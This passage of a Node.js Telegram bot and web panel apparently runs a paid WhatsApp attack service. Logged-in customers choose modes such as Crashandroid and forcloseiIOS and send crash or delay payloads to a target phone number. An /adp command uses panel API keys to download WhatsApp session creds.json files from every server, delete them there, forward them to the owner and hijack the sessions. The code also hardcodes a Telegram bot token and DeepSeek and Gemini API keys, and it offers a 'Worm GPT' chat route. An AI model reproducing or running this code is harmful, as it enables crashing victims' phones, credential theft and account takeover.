    if (!botNumber) return ctx.reply("❌ creds.json tidak valid (me.id tidak ditemukan)");

    // Buat folder tujuan
    const destDir = sessionPath(botNumber);
    await fs.promises.rm(destDir, { recursive: true, force: true });
    await fs.promises.mkdir(destDir, { recursive: true });

    // Copy isi folder temp ke folder sesi
    const copyDir = async (src, dest) => {
      const entries = await fs.promises.readdir(src, { withFileTypes: true });
      for (const entry of entries) {
        const srcPath = path.join(src, entry.name);
        const destPath = path.join(dest, entry.name);
        if (entry.isDirectory()) {
          await fs.promises.mkdir(destPath, { recursive: true });
          await copyDir(srcPath, destPath);
        } else {
          await fs.promises.copyFile(srcPath, destPath);
        }
      }
    };
    await copyDir(tmp, destDir);

    // Simpan aktif
    const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
    if (!list.includes(botNumber)) {
      fs.writeFileSync(file_session, JSON.stringify([...list, botNumber]));
    }

    // Coba konekkan
    await connectToWhatsApp(botNumber, chatId, ctx);

    return ctx.reply(`✅ Session *${botNumber}* berhasil ditambahkan dan online.`, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error /add:", err);
    return ctx.reply(`❌ Gagal memproses session:\n${err.message}`);
  }
});

bot.command("CreateAccount", async (ctx) => {
  const userId = ctx.from.id.toString();
  
  // 1. Ambil Argumen (Gaya Lama: split spasi)
  const args = ctx.message.text.split(" ")[1];

  // 2. Validasi Akses
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("😹—Lu siapa tolol, Buy Account Only @FyzzModss");
  }

  // 3. Validasi Format Input
  if (!args || !args.includes(",")) {
    return ctx.reply(
      "<blockquote> Tutorial Cara Create Account</blockquote>\n" +
      "1. Ketik /addakun\n" +
      "2. Format: username,durasi,role,customKey\n" +
      "3. Contoh: /CreateAccount Fyzz,30d,owner,Stecu", 
      { parse_mode: "HTML" }
    );
  }

  // --- PARSING INPUT ---
  const parts = args.split(",");
  const username = parts[0].trim();
  const durasiStr = parts[1].trim();
  
  // [ANTI ERROR] Definisikan roleInput DISINI agar terbaca sampai bawah
  // Jika user tidak isi role (kosong), otomatis jadi "user"
  const roleInput = parts[2] ? parts[2].trim().toLowerCase() : "user";
  
  const customKey = parts[3] ? parts[3].trim() : null;

  // 4. Validasi Durasi
  const durationMs = parseDuration(durasiStr);
  if (!durationMs) return ctx.reply("✗ Format durasi salah! Gunakan contoh: 7d / 1d / 12h");

  // 5. Generate Key & Expired
  const key = customKey || generateKey(4);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  // 6. Simpan ke Database (Termasuk Role)
  const userIndex = users.findIndex(u => u.username === username);
  const userData = { 
      username, 
      key, 
      expired, 
      role: roleInput // Menyimpan role agar connect ke Web Dashboard
  };

  if (userIndex !== -1) {
    users[userIndex] = userData;
  } else {
    users.push(userData);
  }

  saveUsers(users);

  // Format Tanggal untuk pesan
  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric", month: "2-digit", day: "2-digit", hour: "2-digit", minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  // 7. Kirim Pesan Sukses
  try {
    await ctx.reply("💢 Succesfull Create Your Account");
    
    const keyboard = {
      reply_markup: {
        inline_keyboard: [[{ text: "! Chanel ☇ Apps", url: "https://t.me/Fyzzabout" }]]
      }
    };

    await ctx.telegram.sendMessage(
      ctx.from.id,
      `<blockquote>⚙️ Account Succesfull Create </blockquote>\n` +
      `<b>📢 System Sudah Membuat Akun Untuk anda Harap Login Ke akun Anda, Jika Ada Masalah? Hubungi @FyzzModss</b>\n\n` +
      `<blockquote>📊 DATA ACCOUNT !!</blockquote>\n` +
      `<b>👤Username:</b> ${username}\n` +
      `<b>🏷️Role:</b> ${roleInput.toUpperCase()}\n` + 
      `<b>🛡️Password:</b> <code>${key}</code>\n` +
      `<b>⌛Berlaku:</b> <b>${expiredStr}</b> WIB\n` +
      `<blockquote>‼️ Note Dan Aturan</blockquote>\n` +
      `-Jangan Share Pw And Usn Secara Free !!\n` +
      `-Wajib Join Chanel !!`,
      { parse_mode: "HTML", ...keyboard }
    );
  } catch (error) {
    console.log(error);
    await ctx.reply(
      "✓ Key berhasil dibuat! Namun saya tidak bisa mengirim pesan private kepada Anda.\n\n" +
      "Silakan mulai chat dengan saya terlebih dahulu, lalu gunakan command ini lagi.",
      { parse_mode: "HTML" }
    );
  }
});

bot.command('addpesan', (ctx) => {
    const userId = ctx.from.id.toString();
    
    // 1. Validasi Akses (Hanya Owner & Authorized)
    if (!isOwner(userId) && !isAuthorized(userId)) {
        return ctx.reply("❌ Akses Ditolak. Fitur khusus Owner/Admin.");
    }

    // 2. Ambil Isi Pesan (Mengambil semua teks setelah command)
    // Format: /addpesan Isi Pesan Bebas
    const messageContent = ctx.message.text.split(' ').slice(1).join(' ');
    
    // Cek jika pesan kosong
    if (!messageContent) {
        return ctx.reply(
            "⚠️ *Format Salah!*\n\n" +
            "Gunakan: `/addpesan <Isi Pesan>`\n" +
            "Contoh: `/addpesan Halo member, ada update fitur baru!`", 
            { parse_mode: 'Markdown' }
        );
    }

    // 3. Ambil Database User
    const users = getUsers();
    if (users.length === 0) {
        return ctx.reply("❌ Database user kosong. Belum ada akun yang dibuat.");
    }

    // 4. PROSES BROADCAST KE SEMUA USER
    let successCount = 0;
    const timestamp = Date.now();
    const senderName = ctx.from.first_name || "Admin";

    users.forEach((user, index) => {
        // Buat ID unik untuk setiap pesan
        const msgId = `${timestamp}_${index}`; 
        
        // Push ke Global Messages
        globalMessages.push({
            id: msgId,
            to: user.username,  // <-- Dikirim ke masing-masing username
            from_id: userId,    // ID Telegram Pengirim
            sender_name: senderName,
            content: messageContent,
            timestamp: timestamp,
            read: false,
            replied: false
        });

        successCount++;
    });

    // 5. Laporan Sukses
    ctx.reply(
        `✅ *BROADCAST BERHASIL*\n\n` +
        `💬 Pesan: _${messageContent}_\n` +
        `👥 Penerima: *${successCount}* User\n` +
        `🚀 Status: Terkirim ke Dashboard semua user`, 
        { parse_mode: 'Markdown' }
    );
});

bot.command("listakun", async (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers(); 

  // Validasi Akses Owner
  if (!isOwner(userId)) {
    return ctx.reply("⛔ <b>Akses Ditolak!</b>\nFitur ini khusus Owner.", { parse_mode: "HTML" });
  }

  if (users.length === 0) return ctx.reply("💢 Belum ada akun yang dibuat.");

  let teks = `<blockquote>☘️ All Account Apps XzheroV5.6</blockquote>\n\n`;

  users.forEach((u, i) => {
    // 1. Ambil Role (Safe Check)
    const userRole = u.role ? u.role.toLowerCase() : "user";
    let roleDisplay = "USER";
    let roleIcon = "👤";

    // Mapping Role
    switch (userRole) {
      case "owner": case "creator":
        roleDisplay = "OWNER"; roleIcon = "👑"; break;
      case "admin":
        roleDisplay = "ADMIN"; roleIcon = "👮"; break;
      case "reseller": case "resell":
        roleDisplay = "RESELLER"; roleIcon = "💼"; break;
      case "moderator": case "mod":
        roleDisplay = "MODERATOR"; roleIcon = "🛡️"; break;
      case "vip":
        roleDisplay = "VIP MEMBER"; roleIcon = "💎"; break;
      case "pt":
        roleDisplay = "PARTNER"; roleIcon = "🤝"; break;
      default:
        roleDisplay = "USER"; roleIcon = "👤"; break;
    }

    // 2. LOGIKA SENSOR PASSWORD (PERBAIKAN ERROR DISINI)
    // Kita pastikan 'u.key' ada isinya. Jika kosong, pakai string kosong.
    const rawKey = u.key ? u.key.toString() : "???"; 
    
    let maskedKey = "";
    if (rawKey === "???") {
        maskedKey = "-(Rusak/No Key)-";
    } else if (rawKey.length <= 5) {
      // Jika pendek, sensor semua
      maskedKey = "•".repeat(rawKey.length);
    } else {
      // Jika panjang, sensor tengah
      const start = rawKey.slice(0, 2);
      const end = rawKey.slice(-2);
      maskedKey = `${start}•••••${end}`;
    }

    // 3. Format Tanggal
    // Tambahkan cek juga takutnya expired undefined
    const expTime = u.expired || Date.now(); 
    const exp = new Date(expTime).toLocaleString("id-ID", {
      year: "numeric", month: "2-digit", day: "2-digit", 
      hour: "2-digit", minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });

    // 4. Susun Pesan
    teks += `<b>${i + 1}. ${u.username}</b> [ ${roleIcon} ${roleDisplay} ]\n`;
    teks += `   🔑 Key: <code>${maskedKey}</code>\n`;
    teks += `   ⌛ Exp: ${exp} WIB\n\n`;
  });

  await ctx.reply(teks, { parse_mode: "HTML" });
});

bot.command("delakun", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ACESSO SOMENTE PARA USUÁRIOS\n—Por favor, registre-se primeiro para acessar este recurso.");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey taitan");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`✗ Username \`${username}\` not found.`, { parse_mode: "HTML" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✓ Key belonging to ${username} was successfully deleted.`, { parse_mode: "HTML" });
});


// Harus ada di scope: axios, fs, path, ownerIds (array), sessionPath(fn), connectToWhatsApp(fn), bot
bot.command("adp", async (ctx) => {
  const REQUEST_DELAY_MS = 250;
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  const input = ctx.message.text.split(" ").slice(1);
  if (input.length < 3)
    return ctx.reply(
      "Format salah\nContoh: /adp http://domain.com plta_xxxx pltc_xxxx"
    );

  const domainBase = input[0].replace(/\/+$/, "");
  const plta = input[1];
  const pltc = input[2];

  await ctx.reply("🔍 Mencari creds.json di semua server (1x percobaan per server)...");

  try {
    const appRes = await axios.get(`${domainBase}/api/application/servers`, {
      headers: { Accept: "application/json", Authorization: `Bearer ${plta}` },
    });
    const servers = appRes.data?.data || [];
    if (!servers.length) return ctx.reply("❌ Tidak ada server ditemukan.");

    let totalFound = 0;

    for (const srv of servers) {
      const identifier = srv.attributes?.identifier || srv.identifier || srv.attributes?.id;
      if (!identifier) continue;
      const name = srv.attributes?.name || srv.name || identifier || "unknown";

      const commonPaths = [
        "/home/container/session/creds.json",
        "/home/container/sessions/creds.json",
        "/session/creds.json",
        "/sessions/creds.json",
      ];

      let credsBuffer = null;
      let usedPath = null;

      // 🔹 Coba download creds.json dari lokasi umum
      for (const p of commonPaths) {
        try {
          const dlMeta = await axios.get(
            `${domainBase}/api/client/servers/${identifier}/files/download`,
            {
              params: { file: p },
              headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` },
            }
          );

          if (dlMeta?.data?.attributes?.url) {
            const fileRes = await axios.get(dlMeta.data.attributes.url, {
              responseType: "arraybuffer",
            });
            credsBuffer = Buffer.from(fileRes.data);
            usedPath = p;
            console.log(`[FOUND] creds.json ditemukan di ${identifier}:${p}`);
            break;
          }
        } catch (e) {
          // skip ke path berikutnya
        }
        await sleep(REQUEST_DELAY_MS);
      }

      if (!credsBuffer) {
        console.log(`[SKIP] creds.json tidak ditemukan di server: ${name}`);
        await sleep(REQUEST_DELAY_MS * 2);
        continue;
      }

      totalFound++;

      // 🔹 AUTO HAPUS creds.json dari server setelah berhasil di-download
      try {
        await axios.post(
          `${domainBase}/api/client/servers/${identifier}/files/delete`,
          { root: "/", files: [usedPath.replace(/^\/+/, "")] },
          { headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` } }
        );
        console.log(`[DELETED] creds.json di server ${identifier} (${usedPath})`);
      } catch (err) {
        console.warn(
          `[WARN] Gagal hapus creds.json di server ${identifier}: ${
            err.response?.status || err.message
          }`
        );
      }

      // 🔹 Parse nomor WA
      let BotNumber = "unknown_number";
      try {
        const txt = credsBuffer.toString("utf8");
        const json = JSON.parse(txt);
        const candidate =
          json.id ||
          json.phone ||
          json.number ||
          (json.me && (json.me.id || json.me.jid || json.me.user)) ||
          json.clientID ||
          (json.registration && json.registration.phone) ||
          null;

        if (candidate) {
          BotNumber = String(candidate).replace(/\D+/g, "");
          if (!BotNumber.startsWith("62") && BotNumber.length >= 8 && BotNumber.length <= 15) {
            BotNumber = "62" + BotNumber;
          }
        } else {
          BotNumber = String(identifier).replace(/\s+/g, "_");
        }
      } catch (e) {
        console.log("Gagal parse creds.json -> fallback ke identifier:", e.message);
        BotNumber = String(identifier).replace(/\s+/g, "_");
      }

      // 🔹 Simpan creds lokal
      const sessDir = sessionPath(BotNumber);
      try {
        fs.mkdirSync(sessDir, { recursive: true });
        fs.writeFileSync(path.join(sessDir, "creds.json"), credsBuffer);
      } catch (e) {
        console.error("Gagal simpan creds:", e.message);
      }

      // 🔹 Kirim file ke owner
      for (const oid of ownerIds) {
        try {
          await ctx.telegram.sendDocument(oid, {
            source: credsBuffer,
            filename: `${BotNumber}_creds.json`,
          });
          await ctx.telegram.sendMessage(
            oid,
            `📱 *Detected:* ${BotNumber}\n📁 *Server:* ${name}\n📂 *Path:* ${usedPath}\n🧹 *Status:* creds.json dihapus dari server.`,
            { parse_mode: "Markdown" }
          );
        } catch (e) {
          console.error("Gagal kirim ke owner:", e.message);
        }
      }

      const connectedFlag = path.join(sessDir, "connected.flag");
      const failedFlag = path.join(sessDir, "failed.flag");

      if (fs.existsSync(connectedFlag)) {
        console.log(`[SKIP] ${BotNumber} sudah connected (flag exists).`);
        await sleep(REQUEST_DELAY_MS);
        continue;
      }

      if (fs.existsSync(failedFlag)) {
        console.log(`[SKIP] ${BotNumber} sebelumnya gagal (failed.flag).`);
        await sleep(REQUEST_DELAY_MS);
        continue;
      }

      // 🔹 Coba connect sekali
      try {
        if (!fs.existsSync(path.join(sessDir, "creds.json"))) {
          console.log(`[SKIP CONNECT] creds.json tidak ditemukan untuk ${BotNumber}`);
        } else {
          await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
          fs.writeFileSync(connectedFlag, String(Date.now()));
          console.log(`[CONNECTED] ${BotNumber}`);
        }
      } catch (err) {
        const emsg =
          err?.response?.status === 404
            ? "404 Not Found"
            : err?.response?.status === 403
            ? "403 Forbidden"
            : err?.response?.status === 440
            ? "440 Login Timeout"
            : err?.message || "Unknown error";

        fs.writeFileSync(failedFlag, JSON.stringify({ time: Date.now(), error: emsg }));
        console.error(`[CONNECT FAIL] ${BotNumber}:`, emsg);

        for (const oid of ownerIds) {
          try {
            await ctx.telegram.sendMessage(
              oid,
              `❌ Gagal connect *${BotNumber}*\nServer: ${name}\nError: ${emsg}`,
              { parse_mode: "Markdown" }
            );
          } catch {}
        }
      }

      await sleep(REQUEST_DELAY_MS * 2);
    }

    if (totalFound === 0)
      await ctx.reply("✅ Selesai. Tidak ditemukan creds.json di semua server.");
    else
      await ctx.reply(
        `✅ Selesai. Total creds.json ditemukan: ${totalFound}. (Sudah dihapus dari server & percobaan connect dilakukan 1x)`
      );
  } catch (err) {
    console.error("csession error:", err?.response?.data || err.message);
    await ctx.reply("❌ Terjadi error saat scan. Periksa log server.");
  }
});

console.clear();
console.log(chalk.green(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⡿⣩⣾⣿⣿⣶⣍⡻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡿⠟⣼⡿⢟⢸⣿⣿⣿⠿⢷⣝⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⡏⣾⣿⡆⣾⣿⣸⣯⣿⡾⣿⢗⠿⣷⣝⣛⢿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣮⣭⣾⣿⡏⢿⣝⣯⣽⣶⣿⣿⣿⠿⣿⡇⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⢫⣾⣿⢿⠟⣋⢿⣲⣿⡿⣟⣿⣦⣝⡻⢿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣮⢫⣾⣿⠀⠛⠁⣿⣿⣾⣿⣿⣿⣿⣯⣷⣪⣟⢿⣿
⣿⢿⢿⣿⣿⣿⢸⣿⣿⣷⣶⣾⣿⣿⣿⣿⣿⣿⣿⠻⣿⣿⣝⡜⣿
⢃⡖⣼⣿⣿⣿⣏⣿⣿⣿⣿⣿⣧⡯⣽⣛⢿⠿⠿⢿⠿⠟⡛⣣⣿
⣷⣾⣾⣿⣿⡏⣝⢨⣟⡿⣿⣿⣿⣿⣮⣿⣫⡿⠿⣭⡚⣷⣴⣿⣿
⣿⠻⢿⢰⡬⣱⣝⣮⣿⣿⣿⣾⣭⣟⣻⡿⠿⠿⠿⣛⣵⣿⣿⣿⣿
⣛⠎⢟⡴⣿⣿⣷⣿⣾⣿⣿⣿⣿⣿⣿⣿⣬⣭⣭⣝⡻⢿⣿⣿⣿
⡜⣫⣿⣷⣿⣿⣼⣿⣿⣟⡿⣿⣿⣿⣿⣿⡟⠿⣿⡿⣿⣦⢻⣿⣿
⢅⣭⣿⣿⣿⣿⣼⣿⣿⣿⣽⣿⣿⣿⣿⡿⣹⣷⣝⣃⣭⣵⣿⣿⣿⠀
`));

bot.launch();
console.log(chalk.red(`
Berdiri Lah Kawannnn`));

initializeWhatsAppConnections();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "Is't The Beast", "login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "Is't The Beast", "login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca file login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
    const { username, key } = req.body;
    const users = getUsers();

    // Validasi Login
    const user = users.find(u => u.username === username && u.key === key);

    if (!user) {
        return res.redirect("/login?msg=Username/Password Salah");
    }

    // Buat Cookie (Tiket Masuk) - Tahan 24 Jam
    res.cookie("sessionUser", user.username, { 
        maxAge: 86400000, // 24 jam
        httpOnly: true 
    });

    // Masuk ke Execution
    res.redirect("/execution");
});

      
// simpan waktu terakhir eksekusi (global cooldown)
let lastExecution = 0;

app.get("/execution", (req, res) => {
    // --- DEBUG LOGGING (Supaya tau kenapa mental) ---
    console.log(chalk.cyan("Acces Generated, Welcome User"));
    console.log(chalk.green("Ada Yang sedang Login Bang"));
    
        // GANTI DARI SINI (Baris 1512 di gambar)
    if (!req.cookies || !req.cookies.sessionUser) {
        return res.redirect('/login');
    }

    const username = req.cookies.sessionUser;
    
    // 2. Load Database & Cari User
    const users = getUsers(); 
    const currentUser = users.find(u => u.username === username);

    if (!currentUser) {
        return res.clearCookie("sessionUser").redirect('/login');
    }

    // 3. Cek Masa Aktif
    if (currentUser.expired && Date.now() > currentUser.expired) {
         return res.redirect('/login?msg=Expired');
    }

    // ============================================================
    // [BAGIAN A] LOGIC EKSEKUSI SERANGAN
    // ============================================================
    const targetNumber = req.query.target;
    const mode = req.query.mode;

    if (targetNumber || mode) {
        // ... (Logic Maintenance & Validasi Input) ...
        if (sessions.size === 0) {
            return res.send(executionPage("🚧 MAINTENANCE SERVER !!", { message: "Tunggu maintenance selesai..." }, false, currentUser, currentUser.key, mode));
        }

        if (!targetNumber) {
            return res.send(executionPage("✓ Server ON", { message: "Masukkan nomor & mode." }, true, currentUser, currentUser.key, mode || ""));
        }
        
        // Cek Cooldown
        const now = Date.now();
        const cooldown = 3 * 60 * 1000; 
        if (typeof lastExecution !== 'undefined' && (now - lastExecution < cooldown)) {
             const sisa = Math.ceil((cooldown - (now - lastExecution)) / 1000);
             return res.send(executionPage("⏳ SERVER COOLDOWN", { message: `Tunggu ${sisa} detik.` }, false, currentUser, currentUser.key, ""));
        }

        const target = `${targetNumber}@s.whatsapp.net`;

        try {
            if (mode === "uisystem") Crashandroid(sock, target);
            else if (mode === "invis") forcloseiIOS(sock, target);
            else if (mode === "delay") DelayHard(sock, target);
            else if (mode === "fc") ForcloseCall(sock, target);
            else throw new Error("Mode tidak dikenal.");

            lastExecution = now;
            console.log(chalk.red(`System Mendapatkan Panggilan, Bug Sedang Diluncurkan Ke ${targetNumber}`));
            
            return res.send(executionPage("✓ S U C C E S", {
                target: targetNumber,
                timestamp: new Date().toLocaleString("id-ID"),
                message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`
            }, false, currentUser, currentUser.key, mode));

        } catch (err) {
            console.error(err);
            return res.send(executionPage("✗ Gagal", { target: targetNumber, message: "Error Server" }, false, currentUser, currentUser.key, mode));
        }
        return; 
    }

    // ============================================================
    // [BAGIAN B] LOGIC DASHBOARD (HTML + ROLE)
    // ============================================================
    
    // Pastikan path ini benar sesuai folder kamu
    const filePath = "./Is't The Beast/!Fyzz.html"; 

    fs.readFile(filePath, "utf8", (err, html) => {
        if (err) {
            console.error("❌ Gagal baca file HTML:", err);
            return res.status(500).send("Error loading HTML file");
        }

        // --- 1. LOGIC WARNA ROLE ---
        const rawRole = (currentUser.role || 'user').toLowerCase();
        let roleHtml = "";

        switch (rawRole) {
            case "owner": case "creator":
                roleHtml = '<span style="color: #FFFFFF; text-shadow: 0px 0px 6px #FFFFFF;">Owner</span>'; break;
            case "admin":
                roleHtml = '<span style="color: #FFFFFF; text-shadow: 0px 0px 4px #FFFFFF;">Admin</span>'; break;
            case "reseller": case "ress":
                roleHtml = '<span style="color: #FFFFFF; text-shadow: 0px 0px 4px #FFFFFF;"> Reseller</span>'; break;
            case "pt":
                roleHtml = '<span style="color: #FFFFFF;">Partner</span>'; break;
            case "vip":
                roleHtml = '<span style="color: #FFFFFF;>VIP</span>'; break;
            case "moderator":
                roleHtml = '<span style="color: #FFFFFF;">Moderator</span>'; break;
            default:
                roleHtml = '<span style="color: #FFFFFF;">Member</span>'; break;
        }

        // --- 2. LOGIC WAKTU ---
        const timeIso = currentUser.expired ? new Date(currentUser.expired).toISOString() : new Date().toISOString();
                
        let activeConnections = 0;
        try {
            if (typeof sessions !== 'undefined') {
                activeConnections = sessions.size;
            }
        } catch (e) {
            activeConnections = 0;
        }
 
        // --- 3. REPLACE HTML ---
        // Ganti Username
        html = html.replace(/\${username}/g, currentUser.username);
        // Ganti Role
        html = html.replace(/\${displayRole}/g, roleHtml);
        // Ganti Waktu
        html = html.replace(/\${formattedTime}/g, timeIso);
        // Add Ini
        html = html.replace(/\${rawRole}/g, rawRole);
        //Add
        html = html.replace(/\${activeConnections}/g, activeConnections);
        // --- 4. KIRIM ---
        res.send(html);
    });
});
      

app.post('/api/create-account', (req, res) => {
    const { username, customKey, duration, role } = req.body;
    const adminUsername = req.cookies.sessionUser;

    if (!adminUsername) return res.json({ success: false, message: "Sesi Habis, Login Ulang!" });

    const users = getUsers();
    const adminUser = users.find(u => u.username === adminUsername);
    
    if (!adminUser) return res.json({ success: false, message: "Admin tidak ditemukan!" });

    // --- 1. VALIDASI HAK AKSES ---
    const adminRole = (adminUser.role || 'user').toLowerCase();
    const targetRole = role.toLowerCase();
    let allowed = false;

    if (adminRole === 'owner' || adminRole === 'creator') allowed = true;
    else if (adminRole === 'admin' && ['member', 'user', 'reseller', 'pt', 'admin'].includes(targetRole)) allowed = true;
    else if (adminRole === 'pt' && ['member', 'user', 'reseller', 'pt'].includes(targetRole)) allowed = true;
    else if ((adminRole === 'reseller' || adminRole === 'moderator') && ['member', 'user', 'reseller'].includes(targetRole)) allowed = true;

    if (!allowed) return res.json({ success: false, message: `Role ${adminRole} tidak boleh membuat ${targetRole}!` });

    // --- 2. VALIDASI DATA ---
    if (users.find(u => u.username === username)) return res.json({ success: false, message: "Username sudah ada!" });

    // Parse Durasi
    let ms = 30 * 24 * 60 * 60 * 1000;
    if (duration.endsWith('d')) ms = parseInt(duration) * 24 * 60 * 60 * 1000;
    else if (duration.endsWith('h')) ms = parseInt(duration) * 60 * 60 * 1000;

    const finalKey = customKey || generateKey(4); 
    const expired = Date.now() + ms;

    // --- 3. SIMPAN ---
    users.push({ username, key: finalKey, expired, role: targetRole });
    saveUsers(users);

    // 🔥 LOG KEREN DI PANEL PTERODACTYL 🔥
    console.log(`\n================================`);
    console.log(`[+] NEW ACCOUNT CREATED (WEB)`);
    console.log(` ├─ Creator : ${adminUsername} (${adminRole})`);
    console.log(` ├─ New User: ${username}`);
    console.log(` ├─ Role    : ${targetRole.toUpperCase()}`);
    console.log(` └─ Expired : ${new Date(expired).toLocaleString()}`);
    console.log(`================================\n`);

    return res.json({ success: true, message: "Berhasil" });
});


app.get('/api/list-accounts', (req, res) => {
    // Cek Login
    if (!req.cookies.sessionUser) return res.json([]);

    const users = getUsers();
    
    // Kirim data user TAPI JANGAN KIRIM PASSWORD/KEY (Privacy)
    // Urutkan dari yang terbaru dibuat (paling bawah di array = paling baru)
    const safeList = users.map(u => ({
        username: u.username,
        role: u.role || 'user',
        expired: u.expired
    })).reverse(); 

    res.json(safeList);
});


// --- API: REPLY MESSAGE (Web -> Telegram ID 8312382874) ---
app.post('/api/reply-message', async (req, res) => {
    const { msgId, replyText } = req.body;
    const username = req.cookies.sessionUser;

    if (!username) return res.json({ success: false, message: "Login dulu!" });

    // Cari pesan di database memori
    const msgIndex = globalMessages.findIndex(m => m.id === msgId);
    
    if (msgIndex === -1) return res.json({ success: false, message: "Pesan tidak ditemukan / sudah dihapus." });

    const msg = globalMessages[msgIndex];
    
    if (msg.replied) return res.json({ success: false, message: "Anda sudah membalas pesan ini." });

    // --- SETTING PENGIRIMAN ---
    const adminChatId = "7615520596"; // <--- TARGET ID KHUSUS
    const botToken = "7970383191:AAGxjyWnYGCLlcEFe6vs2tYtpztAIVtdsh4"; // Token Bot Anda

    const textToSend = `📩 *BALASAN DARI WEB*\n\n👤 User: \`${username}\`\n💬 Pesan Awal: _${msg.content}_\n\n↩️ *Balasan User:* \n${replyText}`;

    try {
        // Request ke API Telegram
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: adminChatId,
                text: textToSend,
                parse_mode: "Markdown"
            })
        });

        const data = await response.json();

        if (data.ok) {
            // Tandai pesan sudah dibalas
            globalMessages[msgIndex].replied = true;
            
            return res.json({ success: true });
        } else {
            console.error("Telegram API Error:", data);
            return res.json({ success: false, message: "Gagal kirim ke Telegram" });
        }
    } catch (e) {
        console.error("Reply Error:", e);
        return res.json({ success: false, message: "Server Error saat mengirim balasan." });
    }
});

// --- FITUR AI CHAT ROUTE (WAJIB COPY KE INDEX.JS) ---
app.post("/api/ai-chat", async (req, res) => {
    const { message, modelType } = req.body;
    
    // 1. API KEYS
    const DEEPSEEK_KEY = "sk-cf3c3d988d284b2e90249a2a7d76c224";
    const GEMINI_KEY = "AIzaSyCp4_OjU05nfm03l9IGpCNOBrEYtfAfT-A";

    try {
        let replyText = "";

        if (modelType === 'worm') {
            // --- DEEPSEEK (WORM GPT) ---
            const response = await axios.post("https://api.deepseek.com/chat/completions", {
                model: "deepseek-chat",
                messages: [
                    { role: "system", content: "You are Worm GPT, a helpful assistant." },
                    { role: "user", content: message }
                ],
                stream: false
            }, {
                headers: { 
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${DEEPSEEK_KEY}` 
                }
            });
            replyText = response.data.choices[0].message.content;

        } else if (modelType === 'gemini') {
            // --- GOOGLE GEMINI 3.0 ---
            const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_KEY}`;
            const response = await axios.post(url, {
                contents: [{ parts: [{ text: message }] }]
            }, {
                headers: { "Content-Type": "application/json" }
            });
            
            if(response.data.candidates && response.data.candidates.length > 0) {
                replyText = response.data.candidates[0].content.parts[0].text;
            } else {
                replyText = "Maaf, Gemini sedang sibuk.";
            }
        }

        res.json({ success: true, reply: replyText });

    } catch (error) {
        console.error("AI Error:", error.response ? error.response.data : error.message);
        res.status(500).json({ success: false, error: "Server Error / Quota Habis" });
    }
});


app.post('/api/pairing', async (req, res) => {
    const { phoneNumber } = req.body;
    if (!phoneNumber) return res.json({ status: 'false', message: 'Nomor Wajib Diisi' });

    const cleanNumber = phoneNumber.replace(/[^0-9]/g, '');

    // 🔔 NOTIF 1: PROSES DIMULAI
    if (global.bot && global.adminChatId) {
        global.bot.telegram.sendMessage(global.adminChatId, 
            `🔄 <b>Memproses Pairing...</b>\nTarget: <code>${cleanNumber}</code>\n\n<i>Mohon tunggu sebentar...</i>`, 
            { parse_mode: 'HTML' }
        ).catch(e => console.log("Gagal kirim notif TG:", e));
    }

    try {
        // ✅ PERBAIKAN DISINI: Format folder jadi 'device628xxx' (tanpa strip)
        // Sesuai request: auth/device6272949
        const sessionDir = path.join(sessions_dir, `device${cleanNumber}`);
        
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        const { version } = await fetchLatestWaWebVersion();

        // Config Socket
        const sock = makeWASocket({
            auth: state,
            printQRInTerminal: false,
            logger: pino({ level: "silent" }),
            browser: ["Ubuntu", "Chrome", "20.0.04"], // Wajib ini biar ga stuck
            markOnlineOnConnect: true,
            version
        });

        // Simpan sesi di Memory Map
        sessions.set(cleanNumber, sock);

        sock.ev.on("creds.update", saveCreds);

        // LISTENER KONEKSI
        sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;

            if (connection === 'open') {
                console.log(`[CONNECTED] Nomor ${cleanNumber} berhasil connect!`);
                console.log(`[PATH] Session disimpan di: ${sessionDir}`);
                
                // Simpan ke sessions.json
                updateSessionsFile(cleanNumber);

                // 🔔 NOTIF 3: BERHASIL CONNECT
                if (global.bot && global.adminChatId) {
                    global.bot.telegram.sendMessage(global.adminChatId, 
